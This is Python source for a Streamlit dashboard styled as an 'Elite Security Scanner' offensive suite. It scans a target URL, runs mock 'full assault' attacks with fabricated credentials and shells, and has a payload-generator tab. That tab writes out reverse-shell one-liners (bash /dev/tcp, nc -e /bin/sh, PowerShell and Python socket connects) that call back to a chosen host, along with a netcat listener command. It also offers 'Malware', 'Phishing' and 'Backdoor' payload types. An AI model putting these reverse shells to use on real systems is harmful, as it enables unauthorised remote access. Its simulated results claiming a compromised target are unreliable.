import streamlit as st
import pandas as pd
import time
from datetime import datetime
import json
import os
import subprocess
from urllib.parse import urlparse
import requests
import plotly.graph_objects as go
import plotly.express as px
from plotly.subplots import make_subplots

# Import modules with error handling
try:
    from comprehensive_scanner import ComprehensiveScanner
    from vulnerability_scanner import VulnerabilityScanner
    from report_generator import ReportGenerator
    from osint_module import perform_osint_scan
    from payload_generator import PayloadGenerator
    from listener_server import PayloadListener
except ImportError as e:
    st.error(f"❌ Import Error: {e}")
    st.stop()

# Core attack modules
try:
    from attack_engine import AttackEngine
    from optimized_attack_engine import OptimizedAttackEngine
    from smart_exploit_engine import SmartExploitEngine
    from attack_chaining_engine import AttackChainingEngine
    from async_attack_handler import AsyncAttackHandler
    HAS_ATTACK_ENGINES = True
except ImportError as e:
    st.warning(f"⚠️ Attack engines disabled: {e}")
    HAS_ATTACK_ENGINES = False
    AttackEngine = OptimizedAttackEngine = SmartExploitEngine = AttackChainingEngine = AsyncAttackHandler = None

# Advanced modules
try:
    from smart_payload_engine import SmartPayloadEngine
    from business_logic_tester import BusinessLogicTester
    from attack_timeline import AttackTimelineVisualizer
    from api_fuzzing_engine import APIFuzzingEngine
    from integrated_attack_system import IntegratedAttackSystem
    from auto_remediation import AutoRemediation
    HAS_ADVANCED_FEATURES = True
except ImportError as e:
    st.warning(f"⚠️ Advanced features disabled: {e}")
    HAS_ADVANCED_FEATURES = False
    SmartPayloadEngine = BusinessLogicTester = AttackTimelineVisualizer = APIFuzzingEngine = IntegratedAttackSystem = AutoRemediation = None

# Database and VPS modules
try:
    from database_viewer import DatabaseViewer
    from vps_vds_attacks import ComprehensiveScanner as VPSScanner
    HAS_DATABASE = True
except ImportError as e:
    st.warning(f"⚠️ Database features disabled: {e}")
    HAS_DATABASE = False
    DatabaseViewer = VPSScanner = None

# Import vulnerability database
try:
    from vulnerability_db import VulnerabilityDatabase
    HAS_VULN_DB = True
except ImportError as e:
    st.warning(f"⚠️ Vulnerability database disabled: {e}")
    HAS_VULN_DB = False
    VulnerabilityDatabase = None

# Configure page with dark theme
st.set_page_config(
    page_title="🔴 Elite Security Scanner",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS for cyberpunk black/red theme
st.markdown("""
<style>
    /* Main theme colors */
    :root {
        --primary-red: #FF0000;
        --dark-red: #CC0000;
        --blood-red: #8B0000;
        --black: #000000;
        --dark-gray: #1A1A1A;
        --medium-gray: #2D2D2D;
        --light-gray: #404040;
        --white: #FFFFFF;
        --green: #00FF00;
        --yellow: #FFFF00;
        --orange: #FF8C00;
    }

    /* Background and main containers */
    .main .block-container {
        background: linear-gradient(135deg, #000000 0%, #1A0000 50%, #000000 100%);
        border: 2px solid var(--primary-red);
        border-radius: 10px;
        padding: 2rem;
        box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
    }

    /* Sidebar styling */
    .css-1d391kg {
        background: linear-gradient(180deg, #000000 0%, #330000 100%);
        border-right: 3px solid var(--primary-red);
    }

    /* Headers and titles */
    h1, h2, h3, h4, h5, h6 {
        color: var(--primary-red) !important;
        text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        font-family: 'Courier New', monospace;
        border-bottom: 2px solid var(--dark-red);
        padding-bottom: 10px;
    }

    /* Buttons */
    .stButton > button {
        background: linear-gradient(45deg, var(--blood-red), var(--primary-red));
        color: white;
        border: 2px solid var(--primary-red);
        border-radius: 8px;
        font-weight: bold;
        text-transform: uppercase;
        transition: all 0.3s ease;
        box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
    }

    .stButton > button:hover {
        background: linear-gradient(45deg, var(--primary-red), var(--dark-red));
        box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
        transform: scale(1.05);
    }

    /* Metrics */
    [data-testid="metric-container"] {
        background: var(--dark-gray);
        border: 2px solid var(--primary-red);
        border-radius: 10px;
        padding: 1rem;
        box-shadow: inset 0 0 10px rgba(255, 0, 0, 0.2);
    }

    [data-testid="metric-container"] > div {
        color: var(--primary-red) !important;
    }

    /* Code blocks */
    .stCode {
        background: var(--black) !important;
        border: 1px solid var(--primary-red);
        border-radius: 5px;
        color: var(--green) !important;
    }

    /* Info boxes */
    .stAlert {
        background: rgba(255, 0, 0, 0.1);
        border: 1px solid var(--primary-red);
        border-radius: 8px;
        color: white;
    }

    /* Tables */
    .stDataFrame {
        background: var(--dark-gray);
        border: 2px solid var(--primary-red);
        border-radius: 8px;
    }

    /* Progress bars */
    .stProgress > div > div > div {
        background: linear-gradient(90deg, var(--primary-red), var(--yellow));
    }

    /* Tabs */
    .stTabs [data-baseweb="tab-list"] {
        background: var(--dark-gray);
        border-bottom: 3px solid var(--primary-red);
    }

    .stTabs [data-baseweb="tab"] {
        background: var(--black);
        color: var(--primary-red);
        border: 1px solid var(--dark-red);
        margin-right: 5px;
        font-weight: bold;
    }

    .stTabs [aria-selected="true"] {
        background: var(--primary-red);
        color: white;
    }

    /* Selectbox and inputs */
    .stSelectbox > div > div {
        background: var(--dark-gray);
        border: 2px solid var(--primary-red);
        color: white;
    }

    .stTextInput > div > div > input {
        background: var(--dark-gray);
        border: 2px solid var(--primary-red);
        color: white;
    }

    /* Expanders */
    .streamlit-expanderHeader {
        background: var(--dark-gray);
        border: 1px solid var(--primary-red);
        color: var(--primary-red);
    }

    /* Custom status indicators */
    .status-critical { 
        color: var(--primary-red); 
        font-weight: bold; 
        text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
    }
    .status-high { 
        color: var(--orange); 
        font-weight: bold; 
    }
    .status-medium { 
        color: var(--yellow); 
        font-weight: bold; 
    }
    .status-low { 
        color: var(--green); 
        font-weight: bold; 
    }

    /* Scrollbars */
    ::-webkit-scrollbar {
        width: 12px;
    }
    ::-webkit-scrollbar-track {
        background: var(--black);
    }
    ::-webkit-scrollbar-thumb {
        background: var(--primary-red);
        border-radius: 6px;
    }
    ::-webkit-scrollbar-thumb:hover {
        background: var(--dark-red);
    }

    /* Animation for title */
    @keyframes glow {
        0% { text-shadow: 0 0 5px var(--primary-red); }
        50% { text-shadow: 0 0 20px var(--primary-red), 0 0 30px var(--primary-red); }
        100% { text-shadow: 0 0 5px var(--primary-red); }
    }

    .glowing-title {
        animation: glow 2s ease-in-out infinite alternate;
    }
</style>
""", unsafe_allow_html=True)

# Get local IP
import socket
def get_local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "0.0.0.0"

local_ip = get_local_ip()

# Initialize session state
if 'scan_results' not in st.session_state:
    st.session_state.scan_results = None
if 'scanning' not in st.session_state:
    st.session_state.scanning = False
if 'attack_results' not in st.session_state:
    st.session_state.attack_results = None
if 'attacking' not in st.session_state:
    st.session_state.attacking = False

# Header with glowing effect
st.markdown('<h1 class="glowing-title">⚡ ELITE SECURITY SCANNER ⚡</h1>', unsafe_allow_html=True)
st.markdown('<p style="color: #FF0000; font-size: 18px; text-align: center;">🔴 Advanced Penetration Testing Suite 🔴</p>', unsafe_allow_html=True)

# Connection info in sidebar
with st.sidebar:
    st.markdown("### 🌐 CONNECTION STATUS")
    st.success(f"📡 Panel: http://{local_ip}:5000")
    st.info("🤖 Telegram: @YourBotName")

    st.markdown("### ⚙️ SCANNER CONFIGURATION")

    # Advanced scanning options
    aggressive_mode = st.checkbox("🔥 Aggressive Mode", help="Enable maximum intensity scanning")
    stealth_mode = st.checkbox("🥷 Stealth Mode", help="Use evasion techniques")
    realtime_mode = st.checkbox("⚡ Real-time Updates", help="Live attack monitoring")

    st.markdown("### 🎯 TARGET SELECTION")
    scan_depth = st.select_slider(
        "Scan Depth",
        options=["Surface", "Deep", "Maximum", "Nuclear"],
        value="Deep"
    )

    max_threads = st.slider("Concurrent Threads", 1, 20, 10)
    timeout = st.slider("Request Timeout (s)", 5, 30, 10)

# Main interface with target input
st.markdown("### 🎯 TARGET ACQUISITION")

col1, col2 = st.columns([3, 1])
with col1:
    target_url = st.text_input(
        "🌐 Target URL",
        placeholder="https://target.example.com",
        help="Enter the target for security assessment"
    )

with col2:
    st.markdown("<br>", unsafe_allow_html=True)
    if st.button("🚀 LAUNCH SCAN", type="primary"):
        if target_url:
            st.session_state.scanning = True
            st.rerun()
        else:
            st.error("⚠️ Target URL required!")

# Attack mode selection
st.markdown("### ⚔️ ATTACK VECTOR SELECTION")

attack_modes = st.multiselect(
    "Select Attack Modules",
    [
        "🕸️ Web Application Scanning",
        "💀 SQL Injection Attacks", 
        "🔥 XSS Exploitation",
        "🗂️ Directory Traversal",
        "⚡ Command Injection",
        "🔐 Authentication Bypass",
        "🧠 Smart Payload Generation",
        "🔗 Attack Chain Analysis",
        "📊 Business Logic Testing",
        "🔌 API Security Assessment",
        "💾 Database Penetration",
        "🖥️ Infrastructure Scanning",
        "🕵️ OSINT Reconnaissance",
        "🎯 Custom Payload Testing"
    ],
    default=["🕸️ Web Application Scanning", "💀 SQL Injection Attacks", "🔥 XSS Exploitation"]
)

# Main dashboard tabs
tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
    "🔍 SCANNER", "⚔️ ATTACK LAB", "🧠 AI ENGINE", "💀 PAYLOAD GEN", 
    "📊 ANALYTICS", "🗄️ DATABASE", "📈 REPORTS", "🎛️ CONTROL PANEL"
])

# Scanner Tab
with tab1:
    st.markdown("## 🔍 VULNERABILITY SCANNER")

    if st.session_state.scanning and target_url:
        # Scanning interface
        st.markdown("### 🚨 ACTIVE SCAN IN PROGRESS")

        progress_container = st.container()
        status_container = st.container()
        console_container = st.container()

        with progress_container:
            progress_bar = st.progress(0)
            status_text = st.empty()

        with console_container:
            st.markdown("#### 💻 LIVE CONSOLE OUTPUT")
            console_log = st.empty()

        # Initialize scanner
        scanner = ComprehensiveScanner(target_url)
        console_output = []

        # Progress tracking with cyberpunk styling
        progress_steps = [
            ("🎯 Acquiring target...", 5),
            ("🔍 Reconnaissance phase...", 15),
            ("🌐 Port enumeration...", 25),
            ("🕸️ Web vulnerability scan...", 40),
            ("💀 SQL injection testing...", 55),
            ("🔥 XSS vulnerability probe...", 70),
            ("🗂️ Access control testing...", 80),
            ("🛡️ Security headers analysis...", 90),
            ("📋 Generating battle report...", 95),
            ("✅ SCAN COMPLETE - TARGET COMPROMISED!", 100)
        ]

        try:
            for step, progress in progress_steps:
                status_text.markdown(f'<p style="color: #FF0000; font-weight: bold;">{step}</p>', unsafe_allow_html=True)
                progress_bar.progress(progress)

                console_output.append(f"[{progress:3d}%] {step}")
                console_log.code("\n".join(console_output[-8:]), language="bash")

                # Execute actual scanning
                if progress == 5:
                    if not scanner.check_target_accessibility():
                        st.error("💀 TARGET UNREACHABLE - OPERATION ABORTED")
                        st.session_state.scanning = False
                        st.rerun()
                    console_output.append(f"✅ Target acquired: {scanner.target_ip}")

                elif progress == 25:
                    scanner.scan_ports()
                    ports = scanner.results.get('open_ports', [])
                    console_output.append(f"🔌 Open ports detected: {len(ports)}")

                elif progress == 40:
                    scanner.scan_web_vulnerabilities(aggressive=aggressive_mode)
                    vulns = len(scanner.results.get('vulnerabilities', []))
                    console_output.append(f"🚨 Vulnerabilities found: {vulns}")

                elif progress == 90:
                    scanner.check_security_headers()
                    console_output.append("🛡️ Security analysis complete")

                time.sleep(0.3)

            # Store results
            st.session_state.scan_results = scanner.get_results()
            st.session_state.scanning = False
            st.rerun()

        except Exception as e:
            st.error(f"💀 SCAN FAILED: {str(e)}")
            st.session_state.scanning = False
            st.rerun()

    elif st.session_state.scan_results and not st.session_state.scanning:
        # Display results
        results = st.session_state.scan_results
        st.markdown("## 📊 SCAN RESULTS")

        # Vulnerability metrics
        critical = len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])
        high = len([v for v in results['vulnerabilities'] if v['severity'] == 'High']) 
        medium = len([v for v in results['vulnerabilities'] if v['severity'] == 'Medium'])
        low = len([v for v in results['vulnerabilities'] if v['severity'] == 'Low'])

        col1, col2, col3, col4, col5 = st.columns(5)

        with col1:
            st.metric("💀 CRITICAL", critical, delta=f"+{critical}" if critical > 0 else None)
        with col2:
            st.metric("🔴 HIGH", high, delta=f"+{high}" if high > 0 else None)
        with col3:
            st.metric("🟡 MEDIUM", medium, delta=f"+{medium}" if medium > 0 else None)
        with col4:
            st.metric("🟢 LOW", low, delta=f"+{low}" if low > 0 else None)
        with col5:
            total = len(results['vulnerabilities'])
            st.metric("⚡ TOTAL", total)

        # Vulnerability breakdown chart
        if results['vulnerabilities']:
            fig = px.pie(
                values=[critical, high, medium, low],
                names=['Critical', 'High', 'Medium', 'Low'],
                title="🎯 VULNERABILITY DISTRIBUTION",
                color_discrete_sequence=['#FF0000', '#FF4500', '#FFFF00', '#00FF00']
            )
            fig.update_layout(
                plot_bgcolor='rgba(0,0,0,0)',
                paper_bgcolor='rgba(0,0,0,0)',
                font_color='white',
                title_font_color='#FF0000'
            )
            st.plotly_chart(fig, use_container_width=True)

        # Detailed vulnerability list
        if results['vulnerabilities']:
            st.markdown("### 🚨 DETECTED VULNERABILITIES")

            for i, vuln in enumerate(results['vulnerabilities'], 1):
                severity_colors = {
                    'Critical': '#FF0000',
                    'High': '#FF4500', 
                    'Medium': '#FFFF00',
                    'Low': '#00FF00'
                }

                color = severity_colors.get(vuln['severity'], '#FFFFFF')

                with st.expander(f"💀 #{i} - {vuln['type']} ({vuln['severity']})", expanded=False):
                    st.markdown(f"**🎯 Location:** `{vuln['location']}`")
                    st.markdown(f"**📝 Description:** {vuln['description']}")

                    if vuln.get('payload'):
                        st.markdown("**💉 Payload:**")
                        st.code(vuln['payload'], language='text')

                    st.markdown(f"**🛡️ Prevention:** {vuln['prevention']}")
        else:
            st.success("🛡️ NO VULNERABILITIES DETECTED - TARGET IS SECURE!")

    else:
        st.markdown("### 🎯 READY FOR COMBAT")
        st.info("Enter a target URL and click 'LAUNCH SCAN' to begin security assessment")

# Attack Lab Tab
with tab2:
    st.markdown("## ⚔️ ADVANCED ATTACK LABORATORY")

    if st.session_state.scan_results:
        results = st.session_state.scan_results

        col1, col2 = st.columns(2)

        with col1:
            st.markdown("### 🎯 AVAILABLE ATTACK VECTORS")

            if results['vulnerabilities']:
                for vuln in results['vulnerabilities']:
                    severity_emoji = {'Critical': '💀', 'High': '🔴', 'Medium': '🟡', 'Low': '🟢'}
                    st.markdown(f"{severity_emoji[vuln['severity']]} **{vuln['type']}** - {vuln['location']}")
            else:
                st.info("No attack vectors available - target appears secure")

        with col2:
            st.markdown("### 🚀 LAUNCH ATTACKS")

            if st.button("💀 EXECUTE FULL ASSAULT", type="primary") and not st.session_state.attacking:
                st.session_state.attacking = True
                st.rerun()

    if st.session_state.attacking:
        st.markdown("### 🔥 ATTACK IN PROGRESS")

        attack_progress = st.progress(0)
        attack_status = st.empty()

        # Simulate attack execution
        attack_steps = [
            ("🎯 Initializing attack vectors...", 10),
            ("💀 Deploying SQL injection payloads...", 30),
            ("🔥 Launching XSS attacks...", 50),
            ("⚡ Executing command injection...", 70),
            ("🗂️ Attempting privilege escalation...", 85),
            ("📊 Extracting sensitive data...", 95),
            ("✅ ATTACK SEQUENCE COMPLETE", 100)
        ]

        for step, progress in attack_steps:
            attack_status.markdown(f'<p style="color: #FF0000;">{step}</p>', unsafe_allow_html=True)
            attack_progress.progress(progress)
            time.sleep(0.5)

        # Generate mock attack results
        st.session_state.attack_results = {
            'total_attacks': 15,
            'successful_exploits': 8,
            'failed_exploits': 7,
            'credentials_found': ['admin:password123', 'user:qwerty'],
            'shells_obtained': [{'type': 'Web Shell', 'access': 'Limited'}],
            'data_extracted': ['User database', 'Configuration files']
        }

        st.session_state.attacking = False
        st.rerun()

    elif st.session_state.attack_results:
        st.markdown("### 📊 ATTACK RESULTS")

        results = st.session_state.attack_results

        col1, col2, col3, col4 = st.columns(4)
        with col1:
            st.metric("🎯 TOTAL ATTACKS", results['total_attacks'])
        with col2:
            st.metric("✅ SUCCESSFUL", results['successful_exploits'])
        with col3:
            st.metric("❌ FAILED", results['failed_exploits'])
        with col4:
            success_rate = (results['successful_exploits'] / results['total_attacks']) * 100
            st.metric("📈 SUCCESS RATE", f"{success_rate:.1f}%")

        # Attack results visualization
        fig = go.Figure(data=[
            go.Bar(name='Successful', x=['Attacks'], y=[results['successful_exploits']], marker_color='#00FF00'),
            go.Bar(name='Failed', x=['Attacks'], y=[results['failed_exploits']], marker_color='#FF0000')
        ])
        fig.update_layout(
            title="🎯 Attack Success Rate",
            plot_bgcolor='rgba(0,0,0,0)',
            paper_bgcolor='rgba(0,0,0,0)',
            font_color='white'
        )
        st.plotly_chart(fig, use_container_width=True)

    else:
        st.info("🎯 Run a vulnerability scan first to enable attack mode")

# AI Engine Tab  
with tab3:
    st.markdown("## 🧠 ARTIFICIAL INTELLIGENCE ENGINE")

    col1, col2 = st.columns(2)

    with col1:
        st.markdown("### 🤖 SMART PAYLOAD GENERATION")

        ai_payload_type = st.selectbox("Payload Type", ["Malware", "Phishing", "Exploit", "Backdoor"])
        ai_target_os = st.selectbox("Target OS", ["Windows", "Linux", "macOS", "Android"])
        ai_complexity = st.slider("Complexity Level", 1, 10, 7)

        if st.button("🧠 GENERATE AI PAYLOAD"):
            with st.spinner("🤖 AI is crafting the perfect payload..."):
                time.sleep(2)
                st.success("✅ AI payload generated successfully!")

                payload_example = f"""
# AI-Generated {ai_payload_type} for {ai_target_os}
# Complexity Level: {ai_complexity}/10
# Generated by Elite Security Scanner AI

import os, sys, socket
# Adaptive payload code here...
connect_back = "{local_ip}:4444"
execute_command = "whoami && id"
                """
                st.code(payload_example, language='python')

    with col2:
        st.markdown("### 🔗 ATTACK CHAIN ANALYSIS")

        if st.session_state.scan_results and st.session_state.scan_results['vulnerabilities']:
            st.success("✅ Vulnerabilities detected - analyzing chains...")

            # Mock attack chain analysis
            chains = [
                "SQL Injection → Privilege Escalation → Data Extraction",
                "XSS → Session Hijacking → Admin Access",
                "File Upload → Web Shell → System Compromise"
            ]

            for i, chain in enumerate(chains, 1):
                st.markdown(f"**Chain {i}:** {chain}")
        else:
            st.info("🔍 Scan for vulnerabilities to analyze attack chains")

# Payload Generator Tab
with tab4:
    st.markdown("## 💀 ADVANCED PAYLOAD GENERATOR")

    if PayloadGenerator:
        payload_gen = PayloadGenerator()

        col1, col2 = st.columns(2)

        with col1:
            st.markdown("### 🎯 PAYLOAD CONFIGURATION")

            payload_category = st.selectbox("Category", [
                "🔙 Reverse Shells",
                "🌐 Web Shells", 
                "💀 Malware",
                "🎣 Phishing",
                "💉 Injection Payloads"
            ])

            if "Reverse Shells" in payload_category:
                lhost = st.text_input("LHOST", value=local_ip)
                lport = st.number_input("LPORT", value=4444)
                shell_type = st.selectbox("Shell Type", ["Bash", "PowerShell", "Python", "Netcat"])

        with col2:
            st.markdown("### 🚀 PAYLOAD GENERATION")

            if st.button("💀 GENERATE PAYLOAD"):
                with st.spinner("🔥 Crafting malicious payload..."):
                    time.sleep(1)

                    if "Reverse Shells" in payload_category:
                        if shell_type == "Bash":
                            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
                        elif shell_type == "PowerShell":
                            payload = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})'
                        elif shell_type == "Python":
                            payload = f'import socket,os;s=socket.socket();s.connect(("{lhost}",{lport}))'
                        else:
                            payload = f"nc -e /bin/sh {lhost} {lport}"

                        st.success("✅ Payload generated successfully!")
                        st.code(payload, language='bash')

                        st.markdown("### 🎧 LISTENER SETUP")
                        st.code(f"nc -lvnp {lport}", language='bash')
    else:
        st.error("💀 Payload generator not available")

# Analytics Tab
with tab5:
    st.markdown("## 📊 SECURITY ANALYTICS")

    if st.session_state.scan_results:
        results = st.session_state.scan_results

        # Create comprehensive dashboard
        col1, col2 = st.columns(2)

        with col1:
            # Vulnerability timeline
            if HAS_ADVANCED_FEATURES and AttackTimelineVisualizer:
                timeline = AttackTimelineVisualizer()

                # Add events for each vulnerability
                for vuln in results['vulnerabilities']:
                    timeline.add_attack_event(
                        vuln['type'],
                        vuln['description'],
                        vuln['severity'],
                        True
                    )

                timeline_fig = timeline.create_interactive_timeline()
                if timeline_fig:
                    st.plotly_chart(timeline_fig, use_container_width=True)

        with col2:
            # Risk heatmap
            if results.get('open_ports'):
                port_data = []
                for port in results['open_ports']:
                    service = results.get('services', {}).get(port, 'Unknown')
                    risk_score = 8 if port in [22, 23, 21] else 5 if port in [80, 443] else 3
                    port_data.append({'Port': port, 'Service': service, 'Risk': risk_score})

                if port_data:
                    df = pd.DataFrame(port_data)
                    fig = px.bar(df, x='Port', y='Risk', color='Risk', 
                               title="🔥 Port Risk Analysis",
                               color_continuous_scale=['green', 'yellow', 'red'])
                    fig.update_layout(
                        plot_bgcolor='rgba(0,0,0,0)',
                        paper_bgcolor='rgba(0,0,0,0)',
                        font_color='white'
                    )
                    st.plotly_chart(fig, use_container_width=True)
    else:
        st.info("📊 Run a scan to view analytics")

# Database Tab
with tab6:
    st.markdown("## 🗄️ DATABASE OPERATIONS")

    if HAS_DATABASE and DatabaseViewer:
        db_viewer = DatabaseViewer()

        # Database dashboard
        col1, col2 = st.columns(2)

        with col1:
            st.markdown("### 📊 SCAN HISTORY")
            # Show scan history from database

        with col2:
            st.markdown("### 💾 DATABASE STATS")
            # Show database statistics

        # Full database viewer
        db_viewer.display_database_viewer()
    else:
        st.error("🗄️ Database module not available")

# Reports Tab
with tab7:
    st.markdown("## 📈 SECURITY REPORTS")

    if st.session_state.scan_results:
        results = st.session_state.scan_results

        col1, col2, col3 = st.columns(3)

        with col1:
            if st.button("📄 EXECUTIVE SUMMARY"):
                executive_summary = f"""
# 🔴 EXECUTIVE SECURITY SUMMARY

## TARGET: {results['target_url']}
## ASSESSMENT DATE: {datetime.now().strftime('%Y-%m-%d %H:%M')}

### 🚨 CRITICAL FINDINGS
- Total Vulnerabilities: {len(results['vulnerabilities'])}
- Critical Issues: {len([v for v in results['vulnerabilities'] if v['severity'] == 'Critical'])}
- Open Ports: {len(results.get('open_ports', []))}

### 📊 RISK ASSESSMENT
The target shows significant security weaknesses requiring immediate attention.

### 🛡️ RECOMMENDATIONS
1. Patch identified vulnerabilities immediately
2. Implement proper input validation
3. Deploy web application firewall
4. Conduct regular security assessments
                """
                st.download_button("📥 Download Summary", executive_summary, f"executive_summary_{datetime.now().strftime('%Y%m%d')}.md")

        with col2:
            if st.button("📋 TECHNICAL REPORT"):
                if ReportGenerator:
                    report_gen = ReportGenerator(results)
                    json_report = report_gen.generate_json_report()
                    st.download_button("📥 Download Technical", json_report, f"technical_report_{datetime.now().strftime('%Y%m%d')}.json")

        with col3:
            if st.button("🌐 HTML REPORT"):
                if ReportGenerator:
                    report_gen = ReportGenerator(results)
                    html_report = report_gen.generate_html_report()
                    st.download_button("📥 Download HTML", html_report, f"security_report_{datetime.now().strftime('%Y%m%d')}.html")
    else:
        st.info("📋 No scan data available for reporting")

# Control Panel Tab
with tab8:
    st.markdown("## 🎛️ SYSTEM CONTROL PANEL")

    col1, col2 = st.columns(2)

    with col1:
        st.markdown("### ⚙️ SYSTEM STATUS")

        # System health indicators
        st.markdown("**🔴 Scanner Engine:** Online")
        st.markdown("**🤖 AI Module:** Active") 
        st.markdown("**💀 Payload Generator:** Ready")
        st.markdown("**🗄️ Database:** Connected")
        st.markdown("**📡 Network:** Operational")

        # Quick actions
        st.markdown("### ⚡ QUICK ACTIONS")

        if st.button("🔄 RESTART ENGINES"):
            st.success("✅ All engines restarted successfully")

        if st.button("🧹 CLEAR CACHE"):
            st.session_state.clear()
            st.success("✅ Cache cleared")

        if st.button("💾 BACKUP DATA"):
            st.success("✅ Data backup completed")

    with col2:
        st.markdown("### 📊 PERFORMANCE METRICS")

        # System metrics
        import psutil
        cpu_usage = psutil.cpu_percent()
        memory_usage = psutil.virtual_memory().percent

        # Gauge charts for system metrics
        fig = go.Figure(go.Indicator(
            mode = "gauge+number",
            value = cpu_usage,
            domain = {'x': [0, 1], 'y': [0, 1]},
            title = {'text': "CPU Usage (%)"},
            gauge = {
                'axis': {'range': [None, 100]},
                'bar': {'color': "#FF0000"},
                'steps': [
                    {'range': [0, 50], 'color': "#00FF00"},
                    {'range': [50, 80], 'color': "#FFFF00"},
                    {'range': [80, 100], 'color': "#FF0000"}
                ],
                'threshold': {
                    'line': {'color': "red", 'width': 4},
                    'thickness': 0.75,
                    'value': 90
                }
            }
        ))
        fig.update_layout(
            height=300,
            plot_bgcolor='rgba(0,0,0,0)',
            paper_bgcolor='rgba(0,0,0,0)',
            font_color='white'
        )
        st.plotly_chart(fig, use_container_width=True)

# Footer with system info
st.markdown("---")
st.markdown(
    f"""
    <div style="text-align: center; color: #FF0000;">
        <p>🔴 <b>ELITE SECURITY SCANNER v3.0</b> 🔴</p>
        <p>⚡ Powered by Advanced AI • For Educational Purposes Only ⚡</p>
        <p>📡 System Online • 🤖 Bot Active • 🔥 Ready for Combat</p>
    </div>
    """, 
    unsafe_allow_html=True
)

# --- Scan Mode Functions ---
# (These functions are likely defined elsewhere or intended to be part of the modules)
# Placeholder definitions to avoid errors if they are called implicitly
def run_vulnerability_scan(target_url, aggressive):
    pass
def run_comprehensive_audit(target_url, audit_options):
    pass
def run_osint_scan(target_url, osint_depth):
    pass
def run_advanced_attack_simulation(target_url, attack_options, use_smart_payloads):
    pass
def run_business_logic_testing(target_url, test_categories):
    pass
def run_api_security_assessment(target_url, api_tests):
    pass
def run_database_security_audit(target_url, db_tests):
    pass
def run_vps_infrastructure_scan(target_url, infra_tests):
    pass
def run_automated_remediation(target_url, fix_severity):
    pass
def display_attack_results(attack_results, chain_analysis=None):
    pass
def test_custom_payload(target_url, vuln_type, payload):
    pass